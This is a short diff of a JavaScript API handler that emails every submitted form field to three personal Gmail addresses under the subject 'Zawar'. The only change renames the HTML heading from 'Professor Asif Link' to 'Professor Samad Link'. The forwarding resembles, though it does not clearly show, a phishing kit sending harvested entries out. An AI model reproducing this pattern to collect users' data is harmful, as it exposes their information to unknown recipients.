@@ -40,7 +40,7 @@ export default async function handler(req, res) {
       to: "jessicanur262@gmail.com,smithalive125@gmail.com,samadteam318@gmail.com",
       subject: "Zawar",
       text: JSON.stringify(formData, null, 2),
-      html: `<h3>Professor Asif Link</h3><pre>${JSON.stringify(
+      html: `<h3>Professor Samad Link</h3><pre>${JSON.stringify(
         formData,
         null,
         2
